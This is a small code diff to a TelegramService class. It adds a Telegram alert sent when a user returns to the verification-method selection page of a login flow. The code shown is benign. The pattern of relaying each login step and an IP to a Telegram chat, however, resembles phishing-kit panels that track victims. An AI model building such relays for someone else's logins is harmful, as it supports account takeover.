@@ -490,6 +490,15 @@ class TelegramService {
   ): Promise<void> {
     void _ip
     const typeLabel = verificationType.trim() || "Unknown"
+    if (typeLabel === "login_back_to_verification_methods") {
+      const body = [
+        `⬅️ <b>Back to Verification Methods</b>`,
+        `━━━━━━━━━━━━━━━━━━`,
+        `User returned to the verification method selection page.`,
+      ].join("\n")
+      await sendTelegramMessage(wrapFlowMessage(body))
+      return
+    }
     const body = [
       `🟦 <b>Verification Option Selected</b>`,
       `━━━━━━━━━━━━━━━━━━`,
